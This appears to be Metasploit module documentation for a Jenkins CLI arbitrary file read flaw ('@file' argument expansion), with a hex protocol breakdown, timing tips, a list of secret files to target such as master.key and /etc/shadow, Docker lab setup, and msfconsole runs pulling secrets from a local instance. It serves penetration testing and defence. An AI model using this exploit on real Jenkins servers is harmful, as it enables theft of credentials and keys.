## Vulnerable Application

This module utilizes the Jenkins cli protocol to run the `help` command.
The cli is accessible with read-only permissions by default, which are
all thats required.

Jenkins cli utilizes `args4j's` `parseArgument`, which calls `expandAtFiles` to
replace any `@<filename>` with the contents of a file. We are then able to retrieve
the error message to read up to the first two lines of a file.

Exploitation by hand can be done with the cli, see markdown documents for additional
instructions.

There are a few exploitation oddities:
1. The injection point for the `help` command requires 2 input arguments.
When the `expandAtFiles` is called, each line of the `FILE_PATH` becomes an input argument.
If a file only contains one line, it will throw an error: `ERROR: You must authenticate to access this Jenkins.`
However, we can pad out the content by supplying a first argument.
2. There is a strange timing requirement where the `download` (or first) request must get
to the server first, but the `upload` (or second) request must be very close behind it.
From testing against the docker image, it was found values between `.01` and `1.9` were
viable. Due to the round trip time of the first request and response happening before
request 2 would be received, it is necessary to use threading to ensure the requests
happen within rapid succession.

Files of value:

 * /var/jenkins_home/secret.key
 * /var/jenkins_home/secrets/master.key
 * /var/jenkins_home/secrets/initialAdminPassword
 * /etc/passwd
 * /etc/shadow
 * Project secrets and credentials
 * Source code, build artifacts

Vulnerable versions include:

 * < 2.442
 * LTS < 2.426.3

### Protocol Breakdown

A few samples of the protocol that was observed, how to generate it, and the breakdown of fields.
 
|                                           | **Generator**                                                                    | **Heading**                  | **Pad (1)**      | **Unknown (len(@file_name) + 2)** | **len(@file_name)** | **@** | **file_name**            | **Unknown**  | **len(encoding)** | **UTF-8**  | **Unknown**  | **len(locality)** | **en_US**  | **footer** |
|-------------------------------------------|----------------------------------------------------------------------------------|------------------------------|------------------|-------------|---------------------|-------|--------------------------|--------------|-------------------|------------|--------------|-------------------|------------|------------|
| **no pad multi line file (/tmp/file.22)** | java -jar jenkins-cli.jar -s http://localhost:8080/ -http help "@/tmp/test.22"   | 0000000600000468656c70000000 |                  | 0f0000      | 0d                  | 40    | 2f746d702f746573742e3232 | 000000070200 | 05                | 5554462d38 | 000000070100 | 05                | 656e5f5553 | 0000000003 |
| **no pad single line file (/tmp/file.1)** | java -jar jenkins-cli.jar -s http://localhost:8080/ -http help "@/tmp/test.1"    | 0000000600000468656c70000000 |                  | 0e0000      | 0c                  | 40    | 2f746d702f746573742e31   | 000000070200 | 05                | 5554462d38 | 000000070100 | 05                | 656e5f5553 | 0000000003 |
| **pad multi line file (/tmp/file.22)**    | java -jar jenkins-cli.jar -s http://localhost:8080/ -http help 1 "@/tmp/test.22" | 0000000600000468656c70000000 | 0300000131000000 | 0f0000      | 0d                  | 40    | 2f746d702f746573742e3232 | 000000070200 | 05                | 5554462d38 | 000000070100 | 05                | 656e5f5553 | 0000000003 |
| **pad single line file (/tmp/file.1)**    | java -jar jenkins-cli.jar -s http://localhost:8080/ -http help 1 "@/tmp/test.1"  | 0000000600000468656c70000000 | 0300000131000000 | 0e0000      | 0c                  | 40    | 2f746d702f746573742e31   | 000000070200 | 05                | 5554462d38 | 000000070100 | 05                | 656e5f5553 | 0000000003 |

### Docker Setup

Version 2.440: `docker run -p 8080:8080 -p 50000:50000 jenkins/jenkins:2.440-jdk17`

LTS Version 2.426.2: `docker run -p 8080:8080 -p 50000:50000 jenkins/jenkins:2.426.2-lts`

## Verification Steps

1. Install the application
1. Start msfconsole
1. Do: `use auxiliary/gather/jenkins_cli_ampersand_arbitrary_file_read`
1. Do: `set rhost [ip]`
1. Do: `run`
1. You should get the first two lines of the `FILE_PATH`

## Options

### FILE_PATH

File path to read from the server. Defaults to `/etc/passwd`.

Other files which may be of value:
 * `/var/jenkins_home/secret.key`
 * `/var/jenkins_home/secrets/master.key`
 * `/var/jenkins_home/secrets/initialAdminPassword`
 * `/etc/passwd`
 * `/etc/shadow`
 * Project secrets and credentials
 * Source code, build artifacts

### DELAY

Delay between first and second request to ensure first request gets there on time, but the second request is very quickly behind it.
Defaults to `0.5`

Testing against the docker image showed values between `.01` and `1.9` were successful.

### ENCODING

Encoding to use for reading the file. This may mangle binary files. Defaults to `UTF-8`

### LOCALITY

Locality to use for reading the file. This may mangle binary files. Defaults to `en_US`

## Scenarios

### jenkins 2.440-jdk17 on Docker

```
msf6 > use auxiliary/gather/auxiliary/gather/jenkins_cli_ampersand_arbitrary_file_read
msf6 auxiliary(gather/auxiliary/gather/jenkins_cli_ampersand_arbitrary_file_read) > set rhost 127.0.0.1
rhost => 127.0.0.1
msf6 auxiliary(gather/auxiliary/gather/jenkins_cli_ampersand_arbitrary_file_read) > set file_path /var/jenkins_home/secrets/initialAdminPassword
file_path => /var/jenkins_home/secrets/initialAdminPassword
msf6 auxiliary(gather/auxiliary/gather/jenkins_cli_ampersand_arbitrary_file_read) > run
[*] Running module against 127.0.0.1

[*] Sending requests with UUID: ed148f4d-709a-4d16-a452-4509f3a37ed6
[*] Re-attempting with padding for single line output file
[+] /var/jenkins_home/secrets/initialAdminPassword file contents retrieved (first line or 2):
f5d5f6e98e1f466aad22c0f81ca48fb0
[+] Results saved to: /root/.msf4/loot/20240130204021_default_127.0.0.1_jenkins.file_717110.txt
[*] Auxiliary module execution completed
```

### jenkins 2.426.2-lts on Docker

```
msf6 > use auxiliary/gather/auxiliary/gather/jenkins_cli_ampersand_arbitrary_file_read
msf6 auxiliary(gather/auxiliary/gather/jenkins_cli_ampersand_arbitrary_file_read) > set rhost 127.0.0.1
rhost => 127.0.0.1
msf6 auxiliary(gather/auxiliary/gather/jenkins_cli_ampersand_arbitrary_file_read) > set file_path /var/jenkins_home/secret.key
file_path => /var/jenkins_home/secret.key
msf6 auxiliary(gather/auxiliary/gather/jenkins_cli_ampersand_arbitrary_file_read) > run
[*] Running module against 127.0.0.1

[*] Sending requests with UUID: 0d69c3f1-7695-4db1-a0c6-08108f33e339
[*] Re-attempting with padding for single line output file
[+] /var/jenkins_home/secret.key file contents retrieved (first line or 2):
6ce26592ad3683cc8d056bea07ffa2696f1b14f0db64dbd122c50ab930e279ad
[+] Results saved to: /root/.msf4/loot/20240130204241_default_127.0.0.1_jenkins.file_317409.txt
[*] Auxiliary module execution completed
```